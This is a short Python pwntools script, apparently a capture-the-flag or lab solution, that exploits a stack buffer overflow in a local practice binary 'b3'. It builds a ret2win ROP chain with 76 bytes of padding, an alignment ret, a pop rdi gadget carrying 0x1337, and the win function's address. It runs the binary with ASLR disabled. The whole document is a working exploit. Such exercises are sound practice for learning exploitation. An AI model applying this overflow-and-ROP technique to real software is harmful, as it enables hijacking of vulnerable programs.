#!/usr/bin/env python3
# B3: ret2win con argumento 0x1337
from pwn import context, process, ELF, p64, asm, log
context.binary = "./bin/b3"
elf = ELF("./bin/b3")
OFFSET = 76
win = elf.symbols["win"]
pop_rdi_ret = next(elf.search(asm("pop rdi; ret"), writable=False))
ret = next(elf.search(asm("ret"), writable=False))
log.info(f"pop rdi @ {hex(pop_rdi_ret)}, win @ {hex(win)}")
payload  = b"A" * OFFSET + p64(ret) + p64(pop_rdi_ret) + p64(0x1337) + p64(win)
io = process(["setarch", "x86_64", "-R", "./bin/b3"])
io.sendline(payload)
print(io.recvall(timeout=2).decode(errors="replace"))
